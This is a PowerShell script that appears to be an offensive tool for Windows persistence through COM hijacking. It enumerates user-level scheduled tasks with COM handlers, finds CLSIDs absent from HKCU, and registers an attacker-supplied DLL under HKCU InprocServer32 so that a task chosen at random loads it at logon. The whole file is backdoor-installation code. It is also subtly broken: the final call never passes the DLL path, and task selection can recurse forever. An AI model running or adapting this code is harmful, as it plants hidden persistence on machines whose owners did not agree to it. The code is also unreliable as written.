
param (
    [string]$BackDoorDll
)

$PotentialTaskArr = @()


if($BackDoorDll -eq "") { Write-Host "[!] Please give me a valid location of DLL to set as our persistence mechanism"; exit 0}

function Get-BackDoorTask {


    $selectedTask = Get-Random -InputObject $PotentialTaskArr
    $valid = $false
    foreach($trigger in $selectedTask.Triggers){
        if($trigger -eq "LogOn") { $valid = $true; break }

    }

    if($valid){ return $selectedTask }
    else { Get-BackDoorTask }
    
}

function BackDoorTask { 
    
    param (
        [PSCustomObject]$task,
        [String]$DllPath
    )

    $Path = "HKCU:Software\Classes\CLSID\$($task.ClassId)"
    Write-Host "[*] Creating a new Registry Key: $($Path)"

    New-Item -Path "HKCU:Software\Classes\CLSID" -Name $task.ClassId

    Write-Host "[*] Creating the InprocServer32 Key with a value of: $($DllPath)"

    New-Item -Path $Path -Name "InprocServer32" -Value $DllPath

    Write-Host "[*] Changing the Key's property for obfuscation"

    $Path += "\InprocServer32"
    New-ItemProperty -Path $Path -Name "ThreadingModel" -Value "Both"

}


$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      if ($Task.Principal.GroupId -eq "Users")
      {
        $Path = "Registry::HKCR\CLSID\" + $Task.Actions.ClassId
        $CmpPath = "HKEY_CLASSES_ROOT\CLSID\" + $Task.Actions.ClassId + "\InprocServer32"

        $obj = Get-ChildItem -Path $Path
        if ($obj.Name -eq $CmpPath)
        {
            Write-Host "[*] Found potentially valid Task" $obj.name
            Write-Host "[*] Attempting to identify if HKCU registry key exists and can be HiJacked for persistence"

            $HKLMPath = "HKLM:Software\Classes\CLSID\" + $Task.Actions.ClassID
            $HKLMObj = Get-Item -Path $HKLMPath
            if($HKLMObj -eq $null)
            {
                continue
            }
            else
            {
                
                Write-Host "[*] HKLM Registry Key found!"
                $HKCUPath = "HKCU:Software\Classes\CLSID\" + $Task.Actions.ClassID
                $HKCUObj = Get-Item -Path $HKCUPath -ErrorAction SilentlyContinue
                if($HKCUObj -eq $null)
                {
                    Write-Host "[*] The Task ["$Task.TaskName"] is HiJackable. Querying Task Scheduler to identify frequency of execution"

                    $taskInfo = Get-ScheduledTaskInfo -TaskName $Task.TaskName -TaskPath $Task.TaskPath
                    $triggers = $Task.Triggers
                    $NewObj = [PSCustomObject]@{
                        Name = $($Task.TaskName) 
                        Path = $Task.TaskPath 
                        ClassId = $Task.Actions.ClassId
                        Triggers = @()
                    }
                    foreach ($trigger in $triggers)
                    {
                        switch($trigger.CimClass)
                        {
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskLogonTrigger" { 
                                Write-Output "[*] Frequency: At Log on"
                                $NewObj.Triggers += "LogOn"
                            }
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskLogoffTrigger" { 
                                Write-Output "[*] Frequency: At Log off"
                                $NewObj.Triggers += "LogOff"
                            }
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskDailyTrigger" { 
                                Write-Output "[*] Frequency: Daily"
                                $NewObj.Triggers += "Daily"
                            }
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskWeeklyTrigger" { 
                                Write-Output "[*] Frequency: Weekly"
                                $NewObj.Triggers += "Weekly"
                             }
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskMonthlyTrigger" { 
                                Write-Output "[*] Frequency: Monthly" 
                                $NewObj.Triggers += "Monthly"
                            }
                            #"OneTime" { 
                            #    Write-Output "[*] Frequency: One time" 
                            #}
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskSessionStateChangeTrigger" { 
                                Write-Output "[*] Frequency: Session State-Change"
                                $NewObj.Triggers += "State Change"
                            }
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskEventTrigger" { 
                                Write-Output "[*] Frequency: On event" 
                                $NewObj.Triggers += "Event"
                            }
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskTimeTrigger" { 
                                Write-Output "[*] Frequency: Every $($trigger.Repetition.Interval)" 
                                $NewObj.Triggers += "Time"
                            }
                            "Root/Microsoft/Windows/TaskScheduler:MSFT_TaskBootTrigger" { 
                                Write-Host "[*] Frequency: Boot" 
                                $NewObj.Triggers += "Boot"
                            } 
                            default { Write-Output "[*] Frequency: Unknown" }
                        }
                        

                        
                    }
                    $PotentialTaskArr += $NewObj
                }
                Write-Host
            }
        }
      }
    }
  }
}

Write-Host "[!] will randomly select from the list below to backdoor:"
$count = 0
foreach($obj in $PotentialTaskArr)
{
    $count += 1
    Write-Host "`t$($count): $($obj.Name)"
}

$task = Get-BackDoorTask
Write-Host "[*] Randomly Selected Task : $($task.Name)"
BackDoorTask -task $task